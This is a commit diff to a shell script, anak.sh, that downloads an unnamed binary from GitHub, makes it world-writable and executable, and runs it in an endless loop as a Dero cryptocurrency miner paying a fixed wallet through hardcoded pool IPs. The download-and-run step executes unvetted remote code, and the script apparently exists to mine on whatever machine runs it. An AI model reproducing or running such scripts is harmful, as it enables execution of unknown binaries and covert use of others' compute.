e76b037ba3294ea6b5e9574dda2f3729800b23c2
renilo <88342640+renilo@users.noreply.github.com>
2022-12-22 17:27:25 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -1,9 +1,7 @@
-wget https://github.com/renilo/kuuntul/raw/main/babibu
-chmod 777 babibu
+wget https://github.com/renilo/kuuntul/raw/main/mente
+chmod 777 mente
 
 while :; do
-    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r 167.172.84.152:443 -p stratum;
-    sleep 5;
-    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r 170.187.197.220:443 -p stratum;
+    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r stratum+tcp://51.222.96.66:443 -p stratum;
     sleep 5;
 done
